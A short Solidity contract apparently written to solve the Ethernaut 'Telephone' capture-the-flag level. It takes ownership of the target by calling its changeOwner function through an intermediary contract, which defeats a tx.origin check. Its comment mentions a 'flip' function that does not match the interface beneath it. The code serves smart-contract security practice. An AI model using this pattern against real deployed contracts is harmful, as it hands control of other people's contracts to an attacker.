// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// This tells your contract that the target has a "flip" function it can call
interface Telephone {
    function changeOwner(address _owner) external;
}

contract hackTel {
    address public owner;

    function hackOwner(address _ethernautLevelAddress) public {
        Telephone(_ethernautLevelAddress).changeOwner(msg.sender);
    }
}

